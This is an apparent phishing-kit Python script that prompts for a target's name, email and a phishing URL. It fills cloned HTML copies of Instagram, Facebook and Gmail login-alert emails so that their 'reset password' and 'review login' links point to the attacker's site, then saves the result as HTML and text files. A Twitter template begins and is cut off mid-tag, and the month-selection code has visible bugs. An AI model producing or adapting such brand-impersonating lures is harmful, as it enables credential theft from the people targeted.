import os 
import sys

red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")

start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)

def Instagram():
	Target = input(start + " Enter Target Name: ")
	TargetAccount = input(start + " Enter Target Account Name: ")
	url = input(start + " Enter Phishing Url: ")
	TargetEmail = input(start + " Enter Target Email: ")
	instagram = ("""
	<div dir="ltr" style="margin: 0; padding: 0;">
	<table id="m_-7319109037895721555email_table" style="border-collapse: collapse;" border="0" width="100%;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td id="m_-7319109037895721555email_content" style="font-family: Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; background: #ffffff;">
	<table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
	</tr>
	<tr>
	<td style="line-height: 1px;" colspan="3" height="1">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; border: solid 1px white; margin: 0 auto 5px auto; padding: 3px 0; text-align: center; width: 430px;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	<td style="line-height: 0px; width: 400px; padding: 0 0 15px 0;">
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 100%; text-align: left; height: 33px;"><img class="CToWUd" style="border: 0;" src="https://ci5.googleusercontent.com/proxy/JecDtiZNt9PEkLjyKXOHG6GQJ4ffCEmhMipCKh2K44CFFTTQUmX11SuvnJHe12oZWnvgg-vCdZYtV8qkSIKai4k6xSrxMCMtJH43fzHt1VFA6g=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/jxR-EPx51R9.png" height="33" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	</tr>
	<tr>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	<td style="border-top: solid 1px #c8c8c8;">&nbsp;</td>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto;" width="430" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="display: block; width: 15px;" width="15">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	<td>
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Hi {},</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Someone tried to log in to your Instagram account {}.</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">If this was you, please use the following code to log in:</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;"><span style="font-size: xx-large;">313013</span></p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">If this wasn't you, please <a style="color: #3b5998; text-decoration: none;" href="{}" target="_blank" rel="noopener">reset your password</a> to secure your account.</p>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="line-height: 30px;" colspan="3" height="30">&nbsp;</td>
	</tr>
	<tr>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	<td>
	<div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">&copy; Instagram, Menlo Park, CA 94022</div>
	<div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">This message was sent to <a style="color: #abadae; text-decoration: underline;">{}</a> and intended for {}. Not your account? <a style="color: #abadae; text-decoration: underline;" target="_blank" rel="noopener">Remove your email</a> from this account.</div>
	</td>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<img class="CToWUd" style="border: 0; width: 1px; height: 1px;" src="https://ci6.googleusercontent.com/proxy/f8TdjWWQZLbPuhgu8Gz1qsup6-I9BGWATWktPEUEU4u3RYuDO6deCw2HefCgsGg7hPSe_o7aRGaEmT5eWgbbwrXbav3ivvIxslWLXecN82F4_4M8H7SteqmpOyGarWOjk28YfUHllow0QTWrPMq2HuYbfF5Q4TRWM3y3=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=HMjU0MTE4NTg0OmFwaXpwdWRpbjk2QGdtYWlsLmNvbToxNTg3" /></td>
	</tr>
	</tbody>
	</table>
	</div>""".format(Target, TargetAccount, url, Target, TargetEmail))
	filename = input(start + "Enter Name On HTML File: ")
	TXTname = input(start + "Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(instagram)
	Html_file.close()
	print(alert + " HTML File Created")
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(instagram)
	TXT_file.close()
	print(alert + " TXT file Created")
	
def facebook():
	Target = input(start + "Enter Target Name: " + white)
	TargetEmail = input(start + "Enter Target Email: " + white)
	phishURL = input(start + "Enter Phishing URL: " + white)
	Date = int(input(start + "Enter a number as date: " + white))
	print(green + "\nEnter Month When Login Happend")
	print(green + "[" + white + "1" + green + "]" + white + " January")
	print(green + "[" + white + "2" + green + "]" + white + " February")
	print(green + "[" + white + "3" + green + "]" + white + " March")
	print(green + "[" + white + "4" + green + "]" + white + " April")
	print(green + "[" + white + "5" + green + "]" + white + " May")
	print(green + "[" + white + "6" + green + "]" + white + " June")
	print(green + "[" + white + "7" + green + "]" + white + " July")
	print(green + "[" + white + "8" + green + "]" + white + " August")
	print(green + "[" + white + "9" + green + "]" + white + " September")
	print(green + "[" + white + "10" + green + "]" + white + " October")
	print(green + "[" + white + "11" + green + "]" + white + " November")
	print(green + "[" + white + "12" + green + "]" + white + " December")
	monthpick = int(input("----> "))
	
	if monthpick == 1:
		month = ("January")
	elif monthpick == 2:
		month = ("February")
	elif monthpick == 3:
		month = ("March")
	elif monthpick == 4:
		month = ("April")
	elif monthpick == 5:
		month = ("May")
	elif monthpick == 6:
		month = ("June")
	elif monthpick == 7:
		month = ("July")
	elif monthpick == 8:
		month = ("August")
	elif monthpick == 9:
		month = ("September")
	elif monthpick == 10:
		month ("October")
	elif monthpick == 11:
		month = ("November")
	elif month == 12:
		month = ("December")
	else:
		print(alert + " Error")
		time.sleep(1)
		print("Exiting")
		sys.exit()
	
	year = int(input(start + " Enter Year: "))
	timelog = input(start + " Enter Time (Example, 10:00 pm/am): ")
	city = input(start + " Enter name of city: ")
	country = input(start + " Enter Name of Country: ")

	facebook = ("""
	<html><head></head><body><div style="margin:0;padding:0" dir="ltr" bgcolor="#ffffff"><table cellspacing="0" cellpadding="0" width="100%;" id="m_-5140787778864602591email_table" border="0" style="border-collapse:collapse"><tbody><tr><td id="m_-5140787778864602591email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" style="line-height:1px"><span style="color:#ffffff;display:none!important;font-size:1px"></span></td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="16" style="line-height:16px" colspan="3">&nbsp;</td></tr><tr><td width="32" align="left" valign="middle" style="height:32;line-height:0px"><a style="color:#3b5998;text-decoration:none" target="_blank"><img src="https://ci6.googleusercontent.com/proxy/EtxfQKU-LSNk3Cs2UEF2iTtMjX4XBhsW4wkC-6_XBZV22W3eB-S2JrRw027OocPIFPltHMAtxKA8QWOzc47CUrqu5jLKr9lWj_dvd8Dd1TZEpA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/_2faPUZhPI6.png" width="32" height="32" style="border:0" class="CToWUd"></a></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td width="100%"><a style="color:#3b5998;text-decoration:none;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:19px;line-height:32px" target="_blank" >Login Alert</a></td></tr><tr style="border-bottom:solid 1px #e5e5e5"><td height="16" style="line-height:16px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="28" style="line-height:28px">&nbsp;</td></tr><tr><td><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;font-weight:bold;color:#141823">Hi {},</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Your account was recently logged into from an unrecognized browser or device. Was this you?</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><span style="font-size:10px;font-weight:bold;color:#777">New Login</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci6.googleusercontent.com/proxy/DCTANTsJ1OvRNB6zZT48v37sH3JcbGz_I6HAHayvNwCn1Rob8r9MiKJ1BR-r5XeHt81lkel1D5_MiAsHRpqRfDmyzTkj2HyqQGpas_2qBbC-jg=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/OUnczqecsPd.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823"> {} {}, {} at {}</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci5.googleusercontent.com/proxy/QBDrjhzwIX48mu2IPh7LHsNkIiAd7lRdk76BILhcwZS9DS_KAimbh1JSh1MNokIqcjZNHvhX8is9-3t0O_8_RCsPfHnvT2X0TDGT7hbhPQOxng=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/HLjP6-RaBz8.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Near {}, {}</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci3.googleusercontent.com/proxy/6eUh9zO42iKU02o2lX-pLc3uDyVFjkGqvjU7jnDgBNwGngV7cFiIa3DPoWtXpkyXqhygmeah586FIXGGQYGa6bw_Y9xD7ltzGQwaFLbzznqHzA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/FOZusRNk18E.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Google Chrome</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="2" style="line-height:2px" colspan="3">&nbsp;</td></tr><tr><td class="m_-5140787778864602591mb_blk"><a href="{}" style="color:#3b5998;text-decoration:none" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:2px;text-align:center;display:block;border:solid 1px #344c80;background:#4c649b;padding:7px 16px 11px 16px"><a href="{}" style="color:#3b5998;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#ffffff;font-size:14px;line-height:14px">Review&nbsp;Login</span></font></center></a></td></tr></tbody></table></a></td><td width="10" style="display:block;width:10px" class="m_-5140787778864602591mb_hide">&nbsp;&nbsp;&nbsp;</td><td class="m_-5140787778864602591mb_blk"><a href="{}" style="color:#3b5998;text-decoration:none" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:2px;text-align:center;display:block;border:solid 1px #c9ccd1;background:#f6f7f8;padding:7px 16px 11px 16px"><a href="{}" style="color:#3b5998;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#525252;font-size:14px;line-height:14px">Manage&nbsp;Alerts</span></font></center></a></td></tr></tbody></table></a></td><td width="100%" class="m_-5140787778864602591mb_hide"></td></tr><tr><td height="32" style="line-height:32px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr style="border-top:solid 1px #e5e5e5"><td height="16" style="line-height:16px">&nbsp;</td></tr><tr><td style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:11px;color:#aaaaaa;line-height:16px">This message was sent to <a href="" style="color:#3b5998;text-decoration:none" target="_blank">{}/a>. If you don't want to receive these emails from Facebook in the future, please <a href="" style="color:#3b5998;text-decoration:none" target="_blank" data-saferedirecturl="#link11">unsubscribe</a>.<br>Facebook, Inc., Attention: Community Support, 1 Hacker Way, Menlo Park, CA 94025</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr></tbody></table><span><img src="https://ci5.googleusercontent.com/proxy/HW2B-_UGsdk69Jyhg1T6TPoP85hYe1BMFUnXG1tzXLvolAUwH6t0YiIo4qp5aCDfKneX2WoPW8rAE0T34kLDIX0mSXZNOiQuEaPUHdAvImAazBZauNI1_PSndHlRvKy951jvWI5bsvfOh2oBJC7IqpAoyZXzYQ=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=5464d188693c7G5af398d232efG5464d621c9699G2bf" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table></div></div></div> </div></div></div></div></div></div></div></div></body></html>
	""".format(Target, month, Date, year, timelog, city, country,phishURL, phishURL, phishURL, phishURL, TargetEmail))
	
	filename = input(start + "Enter Name On HTML File: ")
	TXTname = input(start + "Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(facebook)
	Html_file.close()
	print(alert + " HTML File Created")
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(facebook)
	TXT_file.close()
	print(alert + " TXT file Created")
	
def Gmail():
	Target = input(start + "Enter Target Name: " + white)
	TargetEmail = input(start + "Enter Target Email: " + white)
	Day = input(start + "Enter Day ex.Monday: " + white)
	Date = input(start + "Enter Date: " + white)
	Year = input(start + "Enter Year: " + white)
	Time = input(start + "Enter Time (Example, 10:00 pm/am): " + white)
	print(start + "\nEnter Month When Login Happend")
	print(green + "[" + white + "1" + green + "]" + white + " January")
	print(green + "[" + white + "2" + green + "]" + white + " February")
	print(green + "[" + white + "3" + green + "]" + white + " March")
	print(green + "[" + white + "4" + green + "]" + white + " April")
	print(green + "[" + white + "5" + green + "]" + white + " May")
	print(green + "[" + white + "6" + green + "]" + white + " June")
	print(green + "[" + white + "7" + green + "]" + white + " July")
	print(green + "[" + white + "8" + green + "]" + white + " August")
	print(green + "[" + white + "9" + green + "]" + white + " September")
	print(green + "[" + white + "10" + green + "]" + white + " October")
	print(green + "[" + white + "11" + green + "]" + white + " November")
	print(green + "[" + white + "12" + green + "]" + white + " December")
	monthpick = int(input(green + "root@phishmailer:~ " + white))
	Country = input(start + "Enter Country: " + white)
	City = input(start + "Enter A City: " + white)
	PhishUrl = input(start + "Enter A Phishing Url: " + white)
	
	if monthpick == 1:
		month = ("January")
	elif monthpick == 2:
		month = ("February")
	elif monthpick == 3:
		month = ("March")
	elif monthpick == 4:
		month = ("April")
	elif monthpick == 5:
		month = ("May")
	elif monthpick == 6:
		month = ("June")
	elif monthpick == 7:
		month = ("July")
	elif monthpick == 8:
		month = ("August")
	elif monthpick == 9:
		month = ("September")
	elif monthpick == 10:
		month ("October")
	elif monthpick == 11:
		month = ("November")
	elif month == 12:
		month = ("December")
	else:
		print(alert + "Error")
		time.sleep(1)
		print("Exiting")
		sys.exit()
		
	Gmail = ("""<table style="min-width: 348px; width: 100%; height: 100%;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr align="center">
	<td width="32px">&nbsp;</td>
	<td>
	<table style="max-width: 600px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="width: 100%;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td align="left"><img class="CToWUd" style="display: block; width: 92px; height: 32px;" src="https://ci3.googleusercontent.com/proxy/EURRrDHt1LcCbHcRdDtMHOQPPMHe5FkDsMAHs66gxAIYzYD38Abpa1Fmy-ACuq2V1tI8GZdWA4FLsXjKM4iAD-CixwUocANswARkdK1ttXK-T1DDSfiUplKFys37dkM=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/googlelogo_color_188x64dp.png" alt="" width="92" height="32" /></td>
	<td align="right"><img class="CToWUd" style="display: block; width: 32px; height: 32px;" src="https://ci6.googleusercontent.com/proxy/w8ACgsIEmhjGKodu731Z-VOiYfmXsRM4zd6F_w4_cKQ1JPXF_6Y_hEPR_iJKee33yGZ8zR6o_Q08vuYMKmetfyoGNtMpt1d5CU6z3xA=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/keyhole.png" alt="" width="32" height="32" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 332px; max-width: 600px; border-width: 1px 1px 0px; border-image: initial; border-top-left-radius: 3px; border-top-right-radius: 3px; width: 100%; border-color: #e0e0e0 #e0e0e0 initial #e0e0e0; border-style: solid solid initial solid;" border="0" cellspacing="0" cellpadding="0" bgcolor="#4184F3">
	<tbody>
	<tr>
	<td colspan="3" height="72px">&nbsp;</td>
	</tr>
	<tr>
	<td width="32px">&nbsp;</td>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 24px; color: #ffffff; line-height: 1.25;">New <span class="il">sign</span>-in from Chrome on Windows</td>
	<td width="32px">&nbsp;</td>
	</tr>
	<tr>
	<td colspan="3" height="18px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 332px; max-width: 600px; border-width: 0px 1px 1px; border-image: initial; border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; width: 100%; border-color: initial #f0f0f0 #c0c0c0 #f0f0f0; border-style: initial solid solid solid;" border="0" cellspacing="0" cellpadding="0" bgcolor="#FAFAFA">
	<tbody>
	<tr>
	<td rowspan="3" width="32px">&nbsp;</td>
	<td>&nbsp;</td>
	<td rowspan="3" width="32px">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 300px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202020; line-height: 1.5;">Hi {},</td>
	</tr>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202020; line-height: 1.5;">Your Google Account <a>{}</a> was just used to <span class="il">sign</span> in from <span style="white-space: nowrap;">Chrome</span> on <span style="white-space: nowrap;">Windows</span>.
	<table style="margin-top: 48px; margin-bottom: 48px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr valign="middle">
	<td width="32px">&nbsp;</td>
	<td align="center"><img class="CToWUd" style="width: 48px; height: 48px; display: block; border-radius: 50%;" src="https://lh3.googleusercontent.com/-bQZ5NhEHURU/WL5aUNfXA1I/AAAAAAAAAA4/gTy3xQfIhFEyPcxScplho8gYxNp1xC3lwCEw/w140-h140-p/34AD2.jpg" alt="" width="48px" height="48px" /></td>
	<td width="16px">&nbsp;</td>
	<td style="line-height: 1.2;"><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 20px; color: #202020;">{}</span><br /><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #727272;"><a>{}</a></span></td>
	</tr>
	<tr valign="middle">
	<td width="32px" height="24px">&nbsp;</td>
	<td align="center" height="24px"><img class="CToWUd" style="width: 4px; height: 10px; display: block;" src="https://ci4.googleusercontent.com/proxy/3v5djkrQw0eYYuEXwiOUoxXYc3R6bFSVEFNL0C3YbDgAYCp7sUIL4fxyDZ8RADuKX3gZ4_z6bAmrACIqNYpHa95AfUrSskjfkEf4nDXRH7A=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/down_arrow.png" alt="" width="4px" height="10px" /></td>
	</tr>
	<tr valign="top">
	<td width="32px">&nbsp;</td>
	<td align="center"><img class="CToWUd" style="width: 48px; height: 48px; display: block;" src="https://ci6.googleusercontent.com/proxy/8-TvqI07V6c6EfMmOpioytN1akb1_MYoQR5JjP9FrOcBKg-A1ob9_8rI-og2hhemR-SKt-PTzEc8LHrxdtQOnK5WmXqFWq16_l4IuCD9uPzGQipSyU_VqCQpBegNZjcIuYnKtg=s0-d-e1-ft#https://www.gstatic.com/accountalerts/devices/windows_laptop_wallpaper_big.png" alt="" width="48px" height="48px" /></td>
	<td width="16px">&nbsp;</td>
	<td style="line-height: 1.2;"><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 16px; color: #202020;">Windows</span><br /><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #727272;">{}, {} {}, {} {}<br /> {}, {}<br />Chrome</span></td>
	</tr>
	</tbody>
	</table>
	<strong>Don't recognize this activity?</strong><br />Review your <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">recently used devices</a> now.<br /><br />Why are we sending this? We take security very seriously and we want to keep you in the loop on important actions in your account.<br />We were unable to determine whether you have used this browser or device with your account before. This can happen when you <span class="il">sign</span> in for the first time on a new computer, phone or browser, when you use your browser's incognito or private browsing mode or clear your cookies, or when somebody else is accessing your account.</td>
	</tr>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202020; line-height: 1.5;">Best,<br />The Google Accounts team</td>
	</tr>
	<tr>
	<td>
	<table style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 12px; color: #b9b9b9; line-height: 1.5;">
	<tbody>
	<tr>
	<td>*The location is approximate and determined by the IP address it was coming from.</td>
	</tr>
	<tr>
	<td>This email can't receive replies. To give us feedback on this alert, <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">click here</a>.<br />For more information, visit the <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">Google Accounts Help Center</a>.</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="max-width: 600px; font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 10px; color: #bcbcbc; line-height: 1.5;">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 10px; color: #666666; line-height: 18px; padding-bottom: 10px;">
	<tbody>
	<tr>
	<td>You received this mandatory email service announcement to update you about important changes to your Google product or account.</td>
	</tr>
	<tr>
	<td>
	<div style="direction: ltr; text-align: left;">&copy; {} Google Inc., 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td width="32px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<p><br /><br /></p>""".format(Target, TargetEmail, Target, TargetEmail, Day, month, Date, Year, Time, City, Country, PhishUrl, PhishUrl, PhishUrl, Year))
	
	filename = input(start + "Enter Name On HTML File: ")
	TXTname = input(start + "Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(Gmail)
	Html_file.close()
	print(alert + "HTML File Created")
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(Gmail)
	TXT_file.close()
	print(alert + "TXT file Created")

def Twitter():
	AccountName = input(start + " Enter Username: ")
	TargetName = input(start + " Enter Target Name: ")
	City = input(start + " Enter City: ")
	Country = input(start + " Enter Country: ")
	PhishUrl = input(start + " Enter Phishing Url: ") 
	MustContain = input(start + " Your Url Contains (Word In Domain): ")
	Extension = input(start + " Your Enter Your Domain (Example '.com'): ")
	twitter = ("""<div bgcolor="#F5F8FA" style="margin:0;padding:0"><table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#F5F8FA" style="background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937body_wrapper"><tbody><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td style="min-width:448px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937cut"> <img src="https://ci5.googleusercontent.com/proxy/dZihfURYMr4ltOGMmSu7g3JXn4x0ue5ctCYAEwZ-rv1Lx8G77mg5v7CCPyDYzWr4uj2cpj6-5f0-LRFTlHdmZ14PL7dREA1lSKWeXxIwyQjf9Bdb1yJ3JcrK=s0-d-e1-ft#https://ea.twimg.com/email/self_serve/media/spacer-1402696023930.png" style="min-width:448px;height:1px;margin:0;padding:0;display:block;border:none;outline:none" class="CToWUd"> </td></tr></tbody></table> </td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td colspan="3" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px" 